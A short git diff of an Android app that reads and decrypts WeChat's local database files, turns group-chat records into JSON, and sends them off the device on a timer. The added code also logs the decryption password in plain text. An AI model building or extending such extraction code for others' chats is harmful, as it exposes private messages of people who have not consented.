@@ -39,8 +39,23 @@ public class MainActivity extends AppCompatActivity {
                 handle(password);
             }
         });
+        Button button1 = (Button) findViewById(R.id.button1);
+        button1.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                if (password == null || password.trim().equals("")) {
+                    throw new IllegalArgumentException("解密失败！确认密码存在!");
+                }
+                LogUtil.i("解密密码=" + password);
+                new TimerSendNewRecord().timerStart(password);
+            }
+        });
     }
 
+    /**
+     * 发送全部群存在的信息
+     * @param password
+     */
     private void handle(String password) {
         //  递归查询微信本地数据库文件
         List<File> wxDbFileList = WxInfo.getWxDbFileList();
@@ -56,7 +71,7 @@ public class MainActivity extends AppCompatActivity {
                 Gson gson = new Gson();
                 for (Qun qun : qunList) {
                     String res = gson.toJson(qun);
-                    LogUtil.i("发送的json数据为：" + res);
+                    LogUtil.d("发送的json数据为：" + res);
                     //发送数据
                     SendDataUtils.sendData(res);
                 }
